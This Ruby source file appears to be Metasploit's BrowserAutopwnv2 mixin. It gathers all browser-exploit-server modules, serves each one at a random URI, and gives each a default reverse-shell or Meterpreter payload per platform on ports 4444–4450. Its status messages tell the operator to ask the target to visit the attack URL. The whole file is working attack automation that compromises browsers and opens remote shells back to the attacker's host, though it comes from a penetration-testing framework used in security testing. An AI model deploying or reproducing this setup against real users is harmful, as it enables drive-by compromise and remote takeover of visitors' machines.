###
#
# The Msf::Exploit::Remote::BrowserAutopwnv2 mixin is a replacement for the current BrowserAutoPwn
#
###


module Msf
  module Exploit::Remote::BrowserAutopwnv2

    include Msf::Exploit::Remote::BrowserExploitServer

    # @return [Array]
    attr_reader :bap_exploits


    # The default platform-specific payloads and preferred LPORTS
    # The hash key is the name of the platform that matches what's on the module
    DEFAULT_PAYLOADS = {
      'win'     => { 'payload' => 'windows/meterpreter/reverse_tcp', 'lport' => 4444 },
      'linux'   => { 'payload' => 'linux/meterpreter/reverse_tcp',   'lport' => 4445 },
      'osx'     => { 'payload' => 'osx/meterpreter/reverse_tcp',     'lport' => 4446 },
      'java'    => { 'payload' => 'java/meterpreter/reverse_tcp',    'lport' => 4447 },
      'android' => { 'payload' => 'android/meterpreter/reverse_tcp', 'lport' => 4448 },
      'firefox' => { 'payload' => 'firefox/shell_reverse_tcp',       'lport' => 4449 },
      'generic' => { 'payload' => 'generic/shell_reverse_tcp',       'lport' => 4450 }
    }


    # Returns all the found exploit modules that support BrowserExploitServer
    #
    # @return [Array] A collection of BES modules
    def init_exploit_paths
      @bap_exploits ||= lambda {
        framework.exploits.find_all do |m|
          next if m.last == "__SYMBOLIC__" || m.last.fullname == self.fullname
          m.last.ancestors.include? Msf::Exploit::Remote::BrowserExploitServer
        end
      }.call
    end


    # Initializes all found BES exploits
    #
    # @return [void]
    def init_exploits
      init_exploit_paths.each do |m|
        module_name = m.first
        xploit = framework.exploits.create(module_name)
        unless xploit
          print_status("Failed to load: #{name}")
          next
        end
        set_exploit_options(xploit)

        # We don't have the :last method, so we retrieve at -1, which gives us the same thing
        m[-1] = xploit
      end
    end


    # Modifies an exploit's default datastore options
    #
    # @return [void]
    def set_exploit_options(xploit)
      p = pick_default_payload(xploit)
      xploit.datastore['DisablePayloadHandler'] = true            # BAP should handle the handlers
      xploit.datastore['PAYLOAD'] = p['payload']                  # We'll need this information later for multi handler
      xploit.datastore['LPORT']   = p['lport']                    # We'll need this information later for multi handler
      xploit.datastore['SSL'] = datastore['SSL']                  # Use SSL or not
      xploit.datastore['SSLVersion'] = datastore['SSLVersion']    # SSL Version
      xploit.datastore['LHOST'] = datastore['LHOST'] || '0.0.0.0' # Attacker's IP
      xploit.datastore['URI'] = "/#{assign_module_resource}"
    end


    # Checks if a resource is already taken or not
    #
    # @return [TrueClass] Resource is taken
    # @return [FalseClass] Resource is not taken
    def is_resource_taken?(resource)
      taken = false

      bap_exploits.each do |m|
        obj = m.last
        if obj.respond_to?(:datastore) && obj.datastore['URI'] == resource
          # When a module has not be initialized, the object does not have the datastore
          # method. So we need to check that first, so that we can access the URI option
          # safely.
          return true 
        end
      end

      taken
    end


    # Returns a unique resource path
    #
    # @return [String]
    def assign_module_resource
      resource = ''
      while
        resource = Rex::Text.rand_text_alpha(rand(10) + 4)
        break unless is_resource_taken?(resource)
      end

      resource
    end


    # Returns a preferred default payload. The load order is based on this preference:
    # if there is a browser-specific payload (such as firefox), then we'll use that as default.
    # And then we fall back to the module's platform. If there's nothing we can choose,
    # then we'll just use the generic reverse shell.
    #
    # @param [Class] The initialized exploit object
    # @return [Hash] The default payload information from DEFAULT_PAYLOADS
    def pick_default_payload(m)
      module_platforms = m.platform.platforms
      preferred_payload = DEFAULT_PAYLOADS['generic']

      # Specific load order
      if module_platforms.include?('firefox')
        preferred_payload = DEFAULT_PAYLOADS['firefox']
      elsif module_platforms.include?('java')
        preferred_payload = DEFAULT_PAYLOADS['java']
      elsif module_platforms.include?('android')
        preferred_payload = DEFAULT_PAYLOADS['android']
      elsif module_platforms.include?('win')
        preferred_payload = DEFAULT_PAYLOADS['win']
      elsif module_platforms.include?('linux')
        preferred_payload = DEFAULT_PAYLOADS['linux']
      elsif module_platforms.include?('osx')
        preferred_payload = DEFAULT_PAYLOADS['osx']
      end

      preferred_payload
    end


    # Sets up BAPv2. This is like our main function.
    #
    # @return [void]
    def setup
      super
      print_status("Searching BES exploits, please wait...")
      init_exploits
      print_status("#{@bap_exploits.length} BES exploits found.")
    end


    # Overrides the original print_status. It will modify certain outputs to make messages more
    # friendly to understand
    def print_status(msg='')
      case msg
      when /Using URL: /
        msg.gsub!('Using URL: ', '')
        super("BrowserAutoPwn is using URL: #{msg}")
      when /Local IP: /
        msg.gsub!('Local IP: ', '')
        super("Ask your target to visit this URL: #{msg}")
      when /Server started\./
        super("Browser AutoPwn has started.")
      else
        super(msg)
      end
    end


  end
end
